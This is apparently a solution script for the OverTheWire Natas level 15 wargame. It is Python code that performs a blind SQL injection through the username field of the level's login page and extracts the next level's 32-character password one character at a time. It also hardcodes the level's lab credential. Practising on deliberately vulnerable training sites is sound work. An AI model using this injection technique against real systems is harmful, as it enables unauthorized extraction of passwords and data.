#!/bin/python3.7
import requests

url = 'http://natas15.natas.labs.overthewire.org/index.php'

#data is what is inputted into the Username: box.
#stores the "User Doesn't Exist" and "User Does Exist"
r = requests.post(url, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data={'username': 'natas16'})
userExistsText = r.text

r = requests.post(url, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data={'username': 'nothin'})
userDontExistsText = r.text #didn't actually need this


charList = ""
for i in range(33,127): #ASCII
    if((i>=48 and i<=57) or (i>=65 and i<=90) or (i>=97 and i<= 122)): #filters to only get letters and numbers
        charList = charList + chr(i) #chr() turns ascii code to char


password = ""

for i in range(0,32): #password is 32 digits
    print("finding " + str(i) + ". current password is " + password)
    for c in charList:
        print(c, end="\r", flush=True) #fancy print, overwrites last print
        theData = {'username': 'natas16\" and password LIKE BINARY \"' + password + c + '%'} #backslash is escape
        result = (requests.post(url, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data=theData)).text
        
        if(result == userExistsText):
            password = password + c
            break

print("final password is " + password)
